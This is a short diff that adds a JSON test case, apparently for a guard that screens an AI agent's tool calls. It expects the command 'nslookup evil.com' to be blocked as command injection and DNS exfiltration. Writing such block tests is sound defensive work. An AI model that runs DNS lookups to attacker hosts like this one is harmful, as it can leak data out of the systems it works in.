@@ -1,0 +1,9 @@
+{
+  "toolName": "execute_command",
+  "arguments": {
+    "command": "nslookup evil.com"
+  },
+  "expected": "block",
+  "category": "command-injection",
+  "ruleHint": "dns-exfil"
+}
